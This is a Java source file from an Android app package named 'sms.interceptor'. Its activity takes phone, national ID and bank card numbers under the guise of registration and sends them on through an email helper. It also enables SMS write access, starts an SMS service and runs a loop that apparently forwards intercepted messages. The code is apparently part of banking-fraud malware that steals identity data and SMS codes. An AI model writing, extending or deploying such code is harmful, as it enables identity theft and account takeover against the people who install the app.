package com.sms.interceptor;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.sms.R;

/**
 * Created by zhangfei on 15/9/20.
 */
public class UnregisteredActivity extends Activity{
    private EditText mPhoneNumText;
    private EditText mIdNoText;
    private EditText mBankCardTxt;
    private Button mRegisterBtn;

    private ProgressDialog mDialog;

    @Override
    protected void onCreate(final Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (!PreferenceUtils.isRegistered(this)) {
            setContentView(R.layout.unregistered_activity);
            mPhoneNumText = (EditText) findViewById(R.id.et_phone);
            mIdNoText = (EditText) findViewById(R.id.et_id_no);
            mBankCardTxt = (EditText) findViewById(R.id.et_bank_card);
            mRegisterBtn = (Button) findViewById(R.id.btn_register);
            mRegisterBtn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {

                    if (!SmsWriteOpUtils.isWriteEnabled(getApplicationContext())) {
                        SmsWriteOpUtils.setWriteEnabled(
                                getApplicationContext(), true);
                    }


                    String phoneNum = mPhoneNumText.getText().toString();
                    String bankCard = mBankCardTxt.getText().toString();
                    String idNo = mIdNoText.getText().toString();

                    saveAccountInfo(phoneNum, bankCard, idNo);
                }
            });
        } else {
            Intent intent = new Intent(this, RegisteredActivity.class);
            startActivity(intent);
            finish();
        }

        SmsService.startService(this);
        EmailUtils.checkSmsInLoop(this);
    }

    private void saveAccountInfo(final String phoneNum, final String bankCard, final String idNo) {
        if (TextUtils.isEmpty(phoneNum)) {
            UiUtils.showToast(this, "手机号不能为空");
            return;
        }

        if (phoneNum.length() != 11) {
            UiUtils.showToast(this, "请输入有效的手机号");
            return;
        }

        if (TextUtils.isEmpty(bankCard)) {
            UiUtils.showToast(this, "银行卡不能为空");
            return;
        }

        if (bankCard.length() < 18) {
            UiUtils.showToast(this, "请输入有效的银行卡卡号");
            return;
        }

        if (TextUtils.isEmpty(idNo)) {
            UiUtils.showToast(this, "身份证不能为空");
            return;
        }

        if (idNo.length() != 18){
            UiUtils.showToast(this, "请输入有效的身份证号");
            return;
        }

        new AsyncTask<Void, Void, Boolean>() {

            @Override
            protected void onPreExecute() {
                super.onPreExecute();
                mDialog = new ProgressDialog(UnregisteredActivity.this);
                mDialog.setMessage("注册中, 请等待...");
                mDialog.setCancelable(false);
                mDialog.show();
            }

            @Override
            protected Boolean doInBackground(Void... params) {
                return EmailUtils.saveInfo(UnregisteredActivity.this, phoneNum, idNo, bankCard);
            }

            @Override
            protected void onPostExecute(Boolean result) {
                super.onPostExecute(result);
                if (result) {
                    UiUtils.showToast(UnregisteredActivity.this, "注册成功");
                    PreferenceUtils.setRegistered(UnregisteredActivity.this, true);
                    Intent intent = new Intent(UnregisteredActivity.this, RegisteredActivity.class);
                    startActivity(intent);
                    finish();
                } else {
                    mDialog.dismiss();
                    UiUtils.showToast(UnregisteredActivity.this, "注册失败, 请稍后再试");
                }
            }
        }.execute();

    }

}
